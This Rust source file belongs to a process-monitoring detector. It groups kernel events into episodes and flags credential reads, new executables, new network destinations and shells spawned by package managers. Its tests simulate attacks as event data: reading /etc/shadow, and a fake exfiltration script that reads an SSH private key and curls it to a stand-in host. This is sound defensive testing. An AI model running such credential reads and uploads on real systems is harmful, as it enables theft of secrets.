//! Chain builder (SPEC §4.2): turns the event stream into episodes, one per process-tree root.

use std::{
    collections::{BTreeMap, BTreeSet, HashMap, HashSet},
    fs,
    path::Path,
};

use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

use crate::{
    config::Config,
    event::{Container, Data, Event},
    paths,
};

const ARGV_CAP: usize = 256;
const TREE_CAP: usize = 25;
const FILES_CAP: usize = 15;
const NET_CAP: usize = 15;
const SHELLS: &[&str] = &["bash", "sh", "zsh", "fish", "dash", "ksh", "nu"];
const PACKAGE_MANAGERS: &[&str] = &[
    "npm", "npx", "node", "pnpm", "yarn", "bun", "pip", "pip3", "uv", "cargo", "gem", "composer",
];

pub struct Proc {
    pub ppid: Option<u32>,
    pub exe: String,
    pub argv: Vec<String>,
    pub comm: String,
    pub uid: u32,
    /// Pid of this process's episode root.
    pub root: u32,
    /// Name of the ignore rule covering this process, if any.
    pub ignored: Option<String>,
    pub exited_ms: Option<u64>,
    /// Container the process runs in (None: the host, or unknown).
    pub container: Option<Container>,
}

pub struct TreeEntry {
    pub pid: u32,
    pub exe: String,
    pub argv: String,
    pub parent: String,
    execd: bool,
}

pub struct NetEntry {
    pub dest: String,
    pub by: String,
    pub new: bool,
}

pub struct Episode {
    pub id: String,
    pub root: u32,
    /// Container the episode ran in (None: the host, or unknown).
    pub container: Option<Container>,
    pub start_ms: u64,
    pub last_ms: u64,
    pub root_exe: String,
    pub root_argv: String,
    pub root_uid: u32,
    pub root_parent: String,
    pub tree: Vec<TreeEntry>,
    tree_pids: HashSet<u32>,
    pub tree_truncated: usize,
    pub files: BTreeMap<&'static str, BTreeSet<String>>,
    pub other_opens: u64,
    pub net: Vec<NetEntry>,
    pub flags: BTreeSet<String>,
    /// Bumped on every meaningful change; compared with `assessed_version`.
    pub version: u64,
    pub assessed_version: u64,
    pub first_unassessed_ms: Option<u64>,
    pub last_change_ms: u64,
}

impl Episode {
    fn mark_changed(&mut self, ts: u64) {
        self.version += 1;
        self.last_change_ms = ts;
        self.first_unassessed_ms.get_or_insert(ts);
    }

    pub fn sensitive_count(&self) -> usize {
        self.files
            .iter()
            .filter(|(cat, _)| paths::is_sensitive(cat))
            .map(|(_, set)| set.len())
            .sum()
    }

    pub fn needs_assessment(&self) -> bool {
        self.version > self.assessed_version
    }

    /// Cheap pre-filter (SPEC §4.4): only these episodes reach the model.
    pub fn passes_prefilter(&self, assess_new_destinations: bool) -> bool {
        self.sensitive_count() > 0
            || self.flags.contains("new_exe")
            || self.flags.contains("shell_from_package_manager")
            || self.flags.contains("sensitive_in_ignored_tree")
            || (assess_new_destinations && self.flags.contains("new_destination"))
    }

    pub fn label(&self) -> String {
        basename(&self.root_exe).to_string()
    }

    /// Episode JSON in the SPEC §5 shape. Home paths are shortened to `~`.
    pub fn to_json(&self, home: &str) -> Value {
        let tidy = |s: &str| tidy_home(s, home);
        let files: BTreeMap<&str, Vec<String>> = self
            .files
            .iter()
            .map(|(cat, set)| (*cat, set.iter().map(|p| tidy(p)).collect()))
            .collect();
        let mut tree: Vec<Value> = self
            .tree
            .iter()
            .map(|t| json!({ "pid": t.pid, "exe": tidy(&t.exe), "argv": tidy(&t.argv), "parent": t.parent }))
            .collect();
        if self.tree_truncated > 0 {
            tree.push(json!({ "more_processes_not_shown": self.tree_truncated }));
        }
        let mut v = json!({
            "episode_id": self.id,
            "window": { "start": rfc3339(self.start_ms), "end": rfc3339(self.last_ms) },
            "root": {
                "exe": tidy(&self.root_exe),
                "argv": tidy(&self.root_argv),
                "uid": self.root_uid,
                "started_by": self.root_parent,
            },
            "tree": tree,
            "files": files,
            "other_file_opens": self.other_opens,
            "network": self.net.iter().map(|n| json!({ "dest": n.dest, "by": n.by, "new_destination": n.new })).collect::<Vec<_>>(),
            "flags": self.flags,
        });
        // Only when known, so host episodes look exactly as before. The container id is left
        // out: it means nothing to the model.
        if let Some(c) = &self.container {
            let mut m = serde_json::Map::new();
            for (k, val) in [("name", &c.name), ("image", &c.image), ("pod", &c.pod), ("namespace", &c.namespace)] {
                if let Some(val) = val {
                    m.insert(k.into(), json!(val));
                }
            }
            v["container"] = Value::Object(m);
        }
        v
    }
}

/// Things seen before on this machine (SPEC §4.2 local baseline).
#[derive(Default, Serialize, Deserialize)]
pub struct Baseline {
    exes: BTreeSet<String>,
    destinations: BTreeSet<String>,
}

impl Baseline {
    pub fn load(path: &Path) -> (Self, bool) {
        match fs::read_to_string(path) {
            Ok(text) => (serde_json::from_str(&text).unwrap_or_default(), true),
            Err(_) => (Self::default(), false),
        }
    }

    pub fn save(&self, path: &Path) -> anyhow::Result<()> {
        if let Some(dir) = path.parent() {
            fs::create_dir_all(dir)?;
        }
        let tmp = path.with_extension("json.tmp");
        fs::write(&tmp, serde_json::to_vec(self)?)?;
        fs::rename(tmp, path)?;
        Ok(())
    }

    pub fn len(&self) -> (usize, usize) {
        (self.exes.len(), self.destinations.len())
    }
}

pub struct Tracker {
    config: Config,
    own_pid: u32,
    procs: HashMap<u32, Proc>,
    parent_of: HashMap<u32, u32>,
    pub episodes: HashMap<u32, Episode>,
    pub baseline: Baseline,
    /// Until this time (Unix ms) the baseline only learns and raises no `new_*` flags.
    pub learn_until_ms: u64,
    /// Look up processes we haven't seen fork in this machine's /proc. Off when the events
    /// come from another machine (a VM), where these pids mean something else.
    local_proc: bool,
}

impl Tracker {
    pub fn new(config: Config, baseline: Baseline, learn_until_ms: u64) -> Self {
        Self {
            config,
            own_pid: std::process::id(),
            procs: HashMap::new(),
            parent_of: HashMap::new(),
            episodes: HashMap::new(),
            baseline,
            learn_until_ms,
            local_proc: true,
        }
    }

    /// Events come from another machine: never read the local /proc, and don't drop events
    /// whose pid happens to equal this process's.
    pub fn remote(mut self) -> Self {
        self.local_proc = false;
        self.own_pid = 0;
        self
    }

    pub fn ingest(&mut self, ev: Event) {
        if ev.pid == self.own_pid {
            return;
        }
        match &ev.data {
            Data::Fork { child } => {
                if *child != ev.pid {
                    self.parent_of.insert(*child, ev.pid);
                }
                return;
            }
            Data::Exit {} => {
                if let Some(p) = self.procs.get_mut(&ev.pid) {
                    p.exited_ms = Some(ev.ts_ms);
                }
                self.parent_of.remove(&ev.pid);
                return;
            }
            _ => {}
        }

        self.ensure_proc(ev.pid, Some((&ev.comm, ev.uid, ev.container.as_ref())), 0);
        let learning = ev.ts_ms < self.learn_until_ms;
        if let Some(c) = &ev.container
            && let Some(p) = self.procs.get_mut(&ev.pid)
        {
            match &mut p.container {
                Some(pc) if pc.id == c.id => pc.fill_from(c),
                _ => p.container = Some(c.clone()),
            }
            if let Some(ep) = self.episodes.get_mut(&p.root) {
                match &mut ep.container {
                    Some(ec) => ec.fill_from(c),
                    None => ep.container = Some(c.clone()),
                }
            }
        }
        let ts = ev.ts_ms;

        // The kernel reports the real uid on every event, so it beats anything inferred
        // when the process was first seen (e.g. only through its parent's fork).
        if let Some(p) = self.procs.get_mut(&ev.pid) {
            p.uid = ev.uid;
            if p.root == ev.pid
                && let Some(ep) = self.episodes.get_mut(&ev.pid)
            {
                ep.root_uid = ev.uid;
            }
        }

        match ev.data {
            Data::Exec { exe, argv } => self.on_exec(ev.pid, ev.comm, exe, argv, ts, learning),
            Data::Open { path, write, .. } => self.on_open(ev.pid, path, write, ts),
            Data::Net { dest, .. } => self.on_net(ev.pid, dest, ts, learning),
            Data::Fork { .. } | Data::Exit {} => {}
        }
    }

    fn on_exec(&mut self, pid: u32, comm: String, exe: String, argv: Vec<String>, ts: u64, learning: bool) {
        let argv_joined = argv.join(" ");
        let rule = self
            .config
            .ignore
            .iter()
            .find(|r| r.matches(&exe, &comm, &argv_joined))
            .map(|r| r.name.clone());
        let parent_name = self.parent_name(pid);
        let Some(p) = self.procs.get_mut(&pid) else { return };
        p.exe = exe.clone();
        p.argv = argv.clone();
        p.comm = comm.clone();
        if p.ignored.is_none() {
            p.ignored = rule;
        }
        if p.ignored.is_some() {
            return;
        }
        let root = p.root;

        let is_new_exe = !self.baseline.exes.contains(&exe);
        if is_new_exe {
            self.baseline.exes.insert(exe.clone());
        }
        let shell_from_pm = SHELLS.contains(&comm.as_str())
            && PACKAGE_MANAGERS.contains(&parent_name.as_str());

        self.ensure_episode(root, ts);
        let ep = self.episodes.get_mut(&root).expect("episode just ensured");
        ep.last_ms = ep.last_ms.max(ts);
        // Ignore rules match the raw command line (it stays local); episodes store it redacted.
        let shown_argv = self.config.redact.redact_argv(&argv);
        if pid == root {
            // The root's exec defines what the episode is (a forked shell child that runs curl).
            ep.root_exe = exe.clone();
            ep.root_argv = cap(&shown_argv);
        }
        push_tree(ep, pid, &exe, &shown_argv, &parent_name, true);
        if is_new_exe && !learning {
            ep.flags.insert("new_exe".into());
        }
        if shell_from_pm {
            ep.flags.insert("shell_from_package_manager".into());
        }
        ep.mark_changed(ts);
    }

    fn on_open(&mut self, pid: u32, path: String, write: bool, ts: u64) {
        if path.is_empty() {
            return;
        }
        // `dnom collect` resolves relative paths when the event arrives. One that is still
        // relative here couldn't be resolved: match patterns against it, show it as `?/path`.
        let (path, category) = if path.starts_with('/') {
            let category = self.config.paths.categorize(&path, write);
            (path, category)
        } else {
            let category = self.config.paths.categorize(&format!("/{path}"), write);
            (format!("?/{path}"), category)
        };
        let sensitive = category.is_some_and(paths::is_sensitive);
        let Some(p) = self.procs.get(&pid) else { return };
        let ignored = p.ignored.clone();
        if ignored.is_some() && !sensitive {
            return;
        }
        let root = p.root;
        self.ensure_episode(root, ts);
        let ep = self.episodes.get_mut(&root).expect("episode just ensured");
        ep.last_ms = ep.last_ms.max(ts);
        if ignored.is_some() {
            ep.flags.insert("sensitive_in_ignored_tree".into());
        }
        match category {
            Some(cat) => {
                let set = ep.files.entry(cat).or_default();
                if set.len() < FILES_CAP && set.insert(path) && sensitive {
                    ep.mark_changed(ts);
                }
            }
            None => ep.other_opens += 1,
        }
    }

    fn on_net(&mut self, pid: u32, dest: String, ts: u64, learning: bool) {
        let Some(p) = self.procs.get(&pid) else { return };
        if p.ignored.is_some() {
            return;
        }
        let root = p.root;
        let by = basename(&p.exe).to_string();
        // This machine's own unspecified and loopback addresses are not destinations
        // (sshd connects to 0.0.0.0:22 and [::]:22 during every login).
        let is_new = !is_local_dest(&dest)
            && self.baseline.destinations.insert(format!("{} {}", p.exe, dest))
            && !learning;
        self.ensure_episode(root, ts);
        let ep = self.episodes.get_mut(&root).expect("episode just ensured");
        ep.last_ms = ep.last_ms.max(ts);
        if ep.net.iter().any(|n| n.dest == dest && n.by == by) {
            return;
        }
        if ep.net.len() < NET_CAP {
            ep.net.push(NetEntry { dest, by, new: is_new });
            if is_new {
                ep.flags.insert("new_destination".into());
            }
            ep.mark_changed(ts);
        }
    }

    /// Makes sure `pid` (and its ancestors) are in the process table.
    /// `seen` carries comm/uid from the event when the pid was never seen before.
    fn ensure_proc(&mut self, pid: u32, seen: Option<(&str, u32, Option<&Container>)>, depth: u32) {
        if self.procs.contains_key(&pid) {
            return;
        }
        // Forked since dnom started: we know the parent from the fork event. Otherwise /proc.
        let forked_from = self.parent_of.get(&pid).copied();
        let proc_info = if forked_from.is_some() || !self.local_proc { None } else { read_proc(pid) };
        let ppid = forked_from
            .or(proc_info.as_ref().and_then(|i| i.ppid))
            .filter(|&pp| pp > 1 && pp != pid);
        if let Some(pp) = ppid
            && depth < 64
        {
            self.ensure_proc(pp, None, depth + 1);
        }
        let parent = ppid.and_then(|pp| self.procs.get(&pp));

        // A forked child that hasn't exec'd yet is still running its parent's program.
        let (exe, argv, mut comm, ignored) = match (&proc_info, parent) {
            (Some(info), parent) => (
                info.exe.clone(),
                info.argv.clone(),
                info.comm.clone(),
                parent.and_then(|p| p.ignored.clone()),
            ),
            (None, Some(parent)) => (
                parent.exe.clone(),
                parent.argv.clone(),
                parent.comm.clone(),
                parent.ignored.clone(),
            ),
            (None, None) => (String::new(), Vec::new(), String::new(), None),
        };
        if let Some((c, _, _)) = seen
            && !c.is_empty()
        {
            comm = c.to_string();
        }
        // A forked child runs as its parent until it changes credentials. Defaulting to 0
        // here used to make plain user shells look like root.
        let uid = seen
            .map(|(_, u, _)| u)
            .or(proc_info.as_ref().map(|i| i.uid))
            .or(parent.map(|p| p.uid))
            .unwrap_or(0);

        let container = seen.and_then(|(_, _, c)| c.cloned());
        // Entering a container (runc / containerd-shim on the host starts the container's first
        // process) starts a new episode: what runs in a container is its own story.
        let enters_container = container.as_ref().is_some_and(|c| {
            parent.is_some_and(|p| p.container.as_ref().map(|pc| &pc.id) != Some(&c.id))
        });
        let container = container.or_else(|| parent.and_then(|p| p.container.clone()));
        let root = match parent {
            Some(parent) if !enters_container && !self.starts_episode_below(parent) => parent.root,
            _ => pid,
        };
        let ignored = ignored.or_else(|| {
            let argv_joined = argv.join(" ");
            self.config
                .ignore
                .iter()
                .find(|r| r.matches(&exe, &comm, &argv_joined))
                .map(|r| r.name.clone())
        });
        self.procs.insert(
            pid,
            Proc { ppid, exe, argv, comm, uid, root, ignored, exited_ms: None, container },
        );
    }

    /// True if the children of `parent` should each start their own episode.
    fn starts_episode_below(&self, parent: &Proc) -> bool {
        if self.is_boundary(parent) {
            return true;
        }
        // An interactive shell: a shell started directly by a terminal, sshd, tmux, ...
        // Each command typed in it is its own episode. A shell running a script or `-c`
        // (e.g. `ssh host 'cd x && ./script.sh'`, which bash may exec into the script under
        // the same pid) is not interactive: everything it starts belongs to one episode.
        SHELLS.contains(&parent.comm.as_str())
            && is_interactive_shell_argv(&parent.argv)
            && parent
                .ppid
                .and_then(|g| self.procs.get(&g))
                .is_some_and(|g| self.is_boundary(g))
    }

    fn is_boundary(&self, p: &Proc) -> bool {
        let base = basename(&p.exe);
        self.config.boundaries.iter().any(|b| *b == p.comm || *b == base)
    }

    fn parent_name(&self, pid: u32) -> String {
        self.procs
            .get(&pid)
            .and_then(|p| p.ppid)
            .and_then(|pp| self.procs.get(&pp))
            .map(|pp| pp.comm.clone())
            .unwrap_or_default()
    }

    fn ensure_episode(&mut self, root: u32, ts: u64) {
        if self.episodes.contains_key(&root) {
            return;
        }
        let parent_name = self.parent_name(root);
        let (exe, argv, uid, container) = self
            .procs
            .get(&root)
            .map(|p| (p.exe.clone(), self.config.redact.redact_argv(&p.argv), p.uid, p.container.clone()))
            .unwrap_or_default();
        let mut ep = Episode {
            id: format!("ep-{root}-{:05x}", ts & 0xfffff),
            root,
            container,
            start_ms: ts,
            last_ms: ts,
            root_exe: exe.clone(),
            root_argv: cap(&argv),
            root_uid: uid,
            root_parent: parent_name.clone(),
            tree: Vec::new(),
            tree_pids: HashSet::new(),
            tree_truncated: 0,
            files: BTreeMap::new(),
            other_opens: 0,
            net: Vec::new(),
            flags: BTreeSet::new(),
            version: 0,
            assessed_version: 0,
            first_unassessed_ms: None,
            last_change_ms: ts,
        };
        push_tree(&mut ep, root, &exe, &argv, &parent_name, false);
        self.episodes.insert(root, ep);
    }

    /// Closes idle or old episodes and forgets processes that exited a while ago.
    pub fn gc(&mut self, now_ms: u64, idle_ms: u64, max_life_ms: u64) -> usize {
        let before = self.episodes.len();
        self.episodes.retain(|_, ep| {
            now_ms.saturating_sub(ep.last_ms) < idle_ms
                && now_ms.saturating_sub(ep.start_ms) < max_life_ms
        });
        self.procs
            .retain(|_, p| p.exited_ms.is_none_or(|t| now_ms.saturating_sub(t) < 30_000));
        if self.parent_of.len() > 200_000 {
            self.parent_of.clear();
        }
        before - self.episodes.len()
    }
}

/// Adds a tree entry. An exec replaces the pid's entry if that entry was only a placeholder
/// (the process seen before its exec) and otherwise appends, so exec chains stay visible.
fn push_tree(ep: &mut Episode, pid: u32, exe: &str, argv: &str, parent: &str, execd: bool) {
    let first_time = ep.tree_pids.insert(pid);
    if let Some(last) = ep.tree.iter_mut().rev().find(|t| t.pid == pid) {
        if last.exe == exe && last.argv == cap(argv) {
            last.execd |= execd;
            return;
        }
        if !last.execd && execd {
            last.exe = exe.to_string();
            last.argv = cap(argv);
            last.execd = true;
            return;
        }
    }
    if ep.tree.len() >= TREE_CAP {
        if first_time {
            ep.tree_truncated += 1;
        }
        return;
    }
    ep.tree.push(TreeEntry {
        pid,
        exe: exe.to_string(),
        argv: cap(argv),
        parent: parent.to_string(),
        execd,
    });
}

struct ProcInfo {
    ppid: Option<u32>,
    comm: String,
    uid: u32,
    exe: String,
    argv: Vec<String>,
}

/// Fallback for processes that started before dnom: read /proc (racy for short-lived ones).
fn read_proc(pid: u32) -> Option<ProcInfo> {
    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    let open = stat.find('(')?;
    let close = stat.rfind(')')?;
    let comm = stat[open + 1..close].to_string();
    let mut fields = stat[close + 1..].split_whitespace();
    let _state = fields.next();
    let ppid = fields.next().and_then(|f| f.parse().ok());
    let argv: Vec<String> = fs::read(format!("/proc/{pid}/cmdline"))
        .map(|raw| {
            raw.split(|&b| b == 0)
                .filter(|a| !a.is_empty())
                .map(|a| String::from_utf8_lossy(a).into_owned())
                .collect()
        })
        .unwrap_or_default();
    let exe = fs::read_link(format!("/proc/{pid}/exe"))
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| argv.first().cloned().unwrap_or_default());
    let uid = fs::read_to_string(format!("/proc/{pid}/status"))
        .ok()
        .and_then(|s| {
            s.lines()
                .find(|l| l.starts_with("Uid:"))
                .and_then(|l| l.split_whitespace().nth(1))
                .and_then(|u| u.parse().ok())
        })
        .unwrap_or(0);
    Some(ProcInfo { ppid, comm, uid, exe, argv })
}

/// True for `ip:port` / `[ip]:port` destinations on this machine itself: unspecified
/// (0.0.0.0, ::) or loopback (127.0.0.0/8, ::1).
fn is_local_dest(dest: &str) -> bool {
    dest.parse::<std::net::SocketAddr>()
        .is_ok_and(|a| a.ip().is_unspecified() || a.ip().is_loopback())
}

/// True if a shell's arguments look like an interactive session: only options, and no
/// `-c` (alone or in a cluster like `-lc`). A plain argument is a script to run.
/// Unknown argv (process seen only through events) counts as interactive.
fn is_interactive_shell_argv(argv: &[String]) -> bool {
    argv.iter().skip(1).all(|a| {
        if let Some(long) = a.strip_prefix("--") {
            long != "command"
        } else if let Some(short) = a.strip_prefix('-') {
            !short.is_empty() && !short.contains('c')
        } else {
            false
        }
    })
}

pub fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// SPEC §5 input hygiene: argv capped at 256 characters.
fn cap(s: &str) -> String {
    if s.chars().count() <= ARGV_CAP {
        s.to_string()
    } else {
        let mut out: String = s.chars().take(ARGV_CAP).collect();
        out.push('…');
        out
    }
}

fn tidy_home(s: &str, home: &str) -> String {
    if home.len() > 1 {
        s.replace(&format!("{home}/"), "~/")
    } else {
        s.to_string()
    }
}

pub fn rfc3339(ms: u64) -> String {
    let t = std::time::UNIX_EPOCH + std::time::Duration::from_millis(ms);
    humantime::format_rfc3339_seconds(t).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{Data, Event};

    fn ev(ts: u64, pid: u32, uid: u32, comm: &str, data: Data) -> Event {
        Event { ts_ms: ts, pid, tid: pid, uid, comm: comm.into(), cgroup: 1, container: None, data }
    }

    fn in_container(mut e: Event, name: &str, ns: Option<&str>) -> Event {
        e.container = Some(Container {
            id: format!("id-{name}"),
            name: Some(name.into()),
            image: Some("nginx:1.27".into()),
            pod: ns.map(|_| format!("{name}-7f9c")),
            namespace: ns.map(String::from),
        });
        e
    }

    /// containerd-shim (host) starts nginx in a container; nginx starts a shell. The container
    /// is its own episode, labelled with the container, and everything inside stays in it.
    #[test]
    fn container_starts_its_own_labelled_episode() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let (shim, nginx, sh, cat) = (4_190_301, 4_190_302, 4_190_303, 4_190_304);
        t.ingest(ev(0, shim, 0, "containerd-shim", exec("/usr/bin/containerd-shim-runc-v2", &["containerd-shim-runc-v2"])));
        t.ingest(ev(1, shim, 0, "containerd-shim", Data::Fork { child: nginx }));
        t.ingest(in_container(ev(2, nginx, 0, "nginx", exec("/usr/sbin/nginx", &["nginx", "-g", "daemon off;"])), "web", Some("prod")));
        t.ingest(ev(3, nginx, 0, "nginx", Data::Fork { child: sh }));
        t.ingest(in_container(ev(4, sh, 0, "sh", exec("/bin/sh", &["sh", "-c", "cat /etc/shadow"])), "web", Some("prod")));
        t.ingest(ev(5, sh, 0, "sh", Data::Fork { child: cat }));
        t.ingest(in_container(ev(6, cat, 0, "cat", exec("/bin/cat", &["cat", "/etc/shadow"])), "web", Some("prod")));
        t.ingest(in_container(ev(7, cat, 0, "cat", Data::Open { path: "/etc/shadow".into(), flags: 0, write: false }), "web", Some("prod")));

        assert!(t.episodes.contains_key(&nginx), "entering the container starts an episode");
        assert!(!t.episodes.contains_key(&sh) && !t.episodes.contains_key(&cat), "inside the container: same episode");
        let json = t.episodes[&nginx].to_json("/root");
        assert_eq!(json["container"], json!({ "name": "web", "image": "nginx:1.27", "pod": "web-7f9c", "namespace": "prod" }));
        assert_eq!(json["files"]["credentials"][0], "/etc/shadow");
        // Host episodes carry no container block.
        assert!(t.episodes[&shim].to_json("/root").get("container").is_none());
    }

    /// Falco's first events from a new pod can carry only the container id (metadata is looked
    /// up asynchronously); the name and pod on later events must still label the episode.
    #[test]
    fn container_metadata_arriving_late_labels_the_episode() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let (shim, sh) = (4_190_401, 4_190_402);
        t.ingest(ev(0, shim, 0, "containerd-shim", exec("/usr/bin/containerd-shim-runc-v2", &["containerd-shim-runc-v2"])));
        t.ingest(ev(1, shim, 0, "containerd-shim", Data::Fork { child: sh }));
        let mut bare = ev(2, sh, 0, "sh", exec("/bin/sh", &["sh", "-c", "cat /etc/shadow"]));
        bare.container = Some(Container { id: "id-web".into(), name: None, image: None, pod: None, namespace: None });
        t.ingest(bare);
        t.ingest(in_container(ev(3, sh, 0, "sh", Data::Open { path: "/etc/shadow".into(), flags: 0, write: false }), "web", Some("prod")));

        let json = t.episodes[&sh].to_json("/root");
        assert_eq!(json["container"], json!({ "name": "web", "image": "nginx:1.27", "pod": "web-7f9c", "namespace": "prod" }));
    }

    fn exec(exe: &str, argv: &[&str]) -> Data {
        Data::Exec { exe: exe.into(), argv: argv.iter().map(|s| s.to_string()).collect() }
    }

    #[test]
    fn custom_rules_reach_outbound_episode() {
        let config: Config = serde_saphyr::from_str(r#"
paths:
  credentials: [/opt/app/session]
redact:
  secret_names: [APP_SESSION]
"#).unwrap();
        let mut t = Tracker::new(config, Baseline::default(), u64::MAX);
        let pid = 4_190_010;
        t.ingest(ev(1, pid, 1000, "app", exec("/opt/app/bin/app", &["app", "APP_SESSION=example-secret"])));
        t.ingest(ev(2, pid, 1000, "app", Data::Open { path: "/opt/app/session".into(), flags: 0, write: false }));
        let ep = &t.episodes[&pid];
        assert!(ep.passes_prefilter(false));
        let json = ep.to_json("/home/test");
        assert_eq!(json["files"]["credentials"][0], "/opt/app/session");
        assert_eq!(json["root"]["argv"], "app APP_SESSION=[redacted]");
        assert!(!json.to_string().contains("example-secret"));
    }

    #[test]
    fn local_destinations_are_never_new() {
        for local in ["0.0.0.0:22", "[::]:22", "127.0.0.53:53", "[::1]:8009"] {
            assert!(is_local_dest(local), "{local}");
        }
        for remote in ["203.0.113.7:443", "[2001:db8::1]:443", "10.0.0.12:22"] {
            assert!(!is_local_dest(remote), "{remote}");
        }
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let sshd = 4_190_201;
        t.ingest(ev(0, sshd, 0, "sshd-session", exec("/usr/lib/openssh/sshd-session", &["sshd-session"])));
        t.ingest(ev(1, sshd, 0, "sshd-session", Data::Net { op: "connect".into(), dest: "0.0.0.0:22".into() }));
        t.ingest(ev(2, sshd, 0, "sshd-session", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));
        let net = &t.episodes[&sshd].net;
        assert_eq!(net.len(), 2, "local destinations are still recorded");
        assert!(!net[0].new && net[1].new);
    }

    #[test]
    fn interactive_shell_detection() {
        let v = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        for interactive in [&["bash"][..], &["-bash"], &["/usr/bin/bash"], &["bash", "-l"], &["zsh", "-i", "--login"], &[]] {
            assert!(is_interactive_shell_argv(&v(interactive)), "{interactive:?}");
        }
        for not in [&["bash", "-c", "ls"][..], &["bash", "-lc", "ls"], &["bash", "./script.sh"], &["sh", "x.sh", "-e"]] {
            assert!(!is_interactive_shell_argv(&v(not)), "{not:?}");
        }
    }

    /// `ssh vm 'cd ~/dnom && ./scripts/fake-exfil.sh'`: sshd-session starts `bash -c`, which
    /// execs into the script under the same pid. Its children (cat, curl) must stay in the
    /// script's episode, not become separate "typed commands".
    #[test]
    fn script_under_sshd_is_one_episode() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let (sshd, script, cat, curl) = (4_190_101, 4_190_102, 4_190_103, 4_190_104);
        t.ingest(ev(0, sshd, 0, "sshd-session", exec("/usr/lib/openssh/sshd-session", &["sshd-session: lab@notty"])));
        t.ingest(ev(1, sshd, 0, "sshd-session", Data::Fork { child: script }));
        t.ingest(ev(2, script, 1000, "bash", exec("/usr/bin/bash", &["bash", "-c", "cd ~/dnom && ./scripts/fake-exfil.sh"])));
        t.ingest(ev(3, script, 1000, "bash", exec("/usr/bin/bash", &["bash", "./scripts/fake-exfil.sh"])));
        t.ingest(ev(4, script, 1000, "bash", Data::Fork { child: cat }));
        t.ingest(ev(5, cat, 1000, "cat", exec("/usr/bin/cat", &["cat", "/tmp/x/.ssh/id_ed25519"])));
        t.ingest(ev(6, cat, 1000, "cat", Data::Open { path: "/tmp/x/.ssh/id_ed25519".into(), flags: 0, write: false }));
        t.ingest(ev(7, script, 1000, "bash", Data::Fork { child: curl }));
        t.ingest(ev(8, curl, 1000, "curl", exec("/usr/bin/curl", &["curl", "https://203.0.113.7/upload"])));
        t.ingest(ev(9, curl, 1000, "curl", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));
        let ep = &t.episodes[&script];
        assert_eq!(ep.files["credentials"].len(), 1);
        assert_eq!(ep.net.len(), 1, "curl's connection belongs to the script's episode");
        assert!(!t.episodes.contains_key(&curl) && !t.episodes.contains_key(&cat));

        // An interactive login shell under sshd still splits typed commands.
        let (shell, ls) = (4_190_111, 4_190_112);
        t.ingest(ev(10, sshd, 0, "sshd-session", Data::Fork { child: shell }));
        t.ingest(ev(11, shell, 1000, "bash", exec("/usr/bin/bash", &["-bash"])));
        t.ingest(ev(12, shell, 1000, "bash", Data::Fork { child: ls }));
        t.ingest(ev(13, ls, 1000, "ls", exec("/usr/bin/ls", &["ls"])));
        assert!(t.episodes.contains_key(&ls), "a typed command is its own episode");
    }

    /// A shell known only from its parent's fork must not show up as root (uid 0).
    #[test]
    fn forked_child_inherits_uid_and_events_set_it() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0);
        // Pids far above any real ones, so /proc lookups find nothing.
        let (term, shell, cmd) = (4_190_001, 4_190_002, 4_190_003);
        t.ingest(ev(0, term, 1000, "foot", exec("/usr/bin/foot", &["foot"])));
        t.ingest(ev(1, term, 1000, "foot", Data::Fork { child: shell }));
        t.ingest(ev(2, shell, 1000, "bash", Data::Fork { child: cmd }));
        // First event from `cmd` creates the shell only as its ancestor (no event of its own).
        t.ingest(ev(3, cmd, 1000, "cat", exec("/usr/bin/cat", &["cat", "x"])));
        assert_eq!(t.procs[&shell].uid, 1000);
        assert_eq!(t.procs[&cmd].uid, 1000);
        assert_eq!(t.episodes[&cmd].root_uid, 1000);

        // A later event with a different real uid (after setuid) updates it.
        t.ingest(ev(4, cmd, 0, "cat", Data::Open { path: "/etc/shadow".into(), flags: 0, write: false }));
        assert_eq!(t.episodes[&cmd].root_uid, 0);
    }
}
